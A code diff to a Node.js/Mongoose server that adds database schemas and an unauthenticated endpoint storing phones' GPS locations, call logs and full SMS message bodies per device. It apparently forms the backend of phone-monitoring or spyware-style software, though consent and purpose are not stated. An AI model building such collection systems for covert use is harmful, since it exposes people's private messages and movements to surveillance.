@@ -20,14 +20,64 @@ mongoose
   })
   .then(() => console.log("✅ MongoDB connected"))
   .catch((err) => console.error("❌ MongoDB error:", err));
-
-// Schema & Model
+// Schemas
 const LocationSchema = new mongoose.Schema({
+  device: String,
   longitude: Number,
   latitude: Number,
   timestamp: { type: Date, default: Date.now }
 });
 const Location = mongoose.model("Location", LocationSchema);
+
+const CallLogSchema = new mongoose.Schema({
+  device: String,
+  number: String,
+  type: String,
+  date: String,
+  duration: String,
+  timestamp: { type: Date, default: Date.now }
+});
+const CallLog = mongoose.model("CallLog", CallLogSchema);
+
+const SmsSchema = new mongoose.Schema({
+  device: String,
+  address: String,
+  body: String,
+  date: String,
+  timestamp: { type: Date, default: Date.now }
+});
+const Sms = mongoose.model("Sms", SmsSchema);
+
+
+
+// -------------------
+// Combined API route
+// -------------------
+app.post("/api/post-data", async (req, res) => {
+  try {
+    const { device, latitude, longitude, callLogs, messages } = req.body;
+
+    // 1. Save Location
+    if (typeof latitude === "number" && typeof longitude === "number") {
+      await new Location({ device, latitude, longitude }).save();
+    }
+
+    // 2. Save Call Logs
+    if (Array.isArray(callLogs)) {
+      await CallLog.insertMany(callLogs.map(c => ({ ...c, device })));
+    }
+
+    // 3. Save SMS
+    if (Array.isArray(messages)) {
+      await Sms.insertMany(messages.map(m => ({ ...m, device })));
+    }
+
+    res.json({ message: "Data saved successfully" });
+  } catch (err) {
+    console.error("❌ Error in /api/post-data:", err);
+    res.status(500).json({ error: "Server error" });
+  }
+});
 
 // Routes
 app.post("/api/push", async (req, res) => {
